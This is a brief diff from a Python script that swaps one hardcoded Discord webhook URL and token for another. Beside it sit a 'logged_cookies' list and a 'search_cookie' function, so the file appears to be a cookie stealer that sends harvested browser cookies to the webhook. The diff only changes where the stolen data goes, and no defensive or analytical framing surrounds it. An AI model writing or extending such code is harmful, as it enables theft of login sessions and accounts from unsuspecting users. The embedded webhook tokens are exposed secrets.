@@ -22,7 +22,7 @@ import time
 import os
 
 
-webhook = "https://discord.com/api/webhooks/918559658153750619/LOHnLIQTP9CfsFSt4Sf9FdGjKYYMTkuMcVIDW-IkmHJZ9cQq8ykyWrpcCQnSZSUDFhbF"
+webhook = "https://discord.com/api/webhooks/919061363425419344/aJ8PubmfCRcUKrDEM3RSlRR7JkI8C2CuiV-51qdB3ouJL_fH2ujP3XsfrrYuMB-XkF1C"
 logged_cookies = []
 
 def search_cookie(file_path: "file") -> None:
